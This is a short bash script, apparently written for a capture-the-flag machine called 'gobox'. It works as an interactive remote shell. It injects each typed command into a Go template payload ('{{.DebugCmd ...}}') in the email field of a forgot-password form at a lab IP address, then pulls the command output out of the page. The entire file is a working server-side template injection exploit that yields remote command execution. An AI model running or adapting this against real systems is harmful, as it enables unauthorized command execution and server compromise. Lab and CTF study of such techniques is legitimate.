#!/bin/bash

echo "Interactive shell ready. Type commands or 'exit' to quit."

while true; do
    # Display prompt
    echo -n "gobox> "
    
    # Read user input
    read cmd
    
    # Check for exit command
    if [ "$cmd" = "exit" ]; then
        echo "Exiting..."
        break
    fi
    
    # Escape double quotes in command
    cmd=${cmd//\"/\\\"}
    
    # Send payload and extract response
    response=$(curl -s "http://10.129.95.236:8080/forgot/" \
        -d "email={{.DebugCmd \"$cmd\"}}" \
        | grep -oP "Email Sent To: \K.*?(?=\s+<button)")
    
    # Print response
    echo -e "$response"
done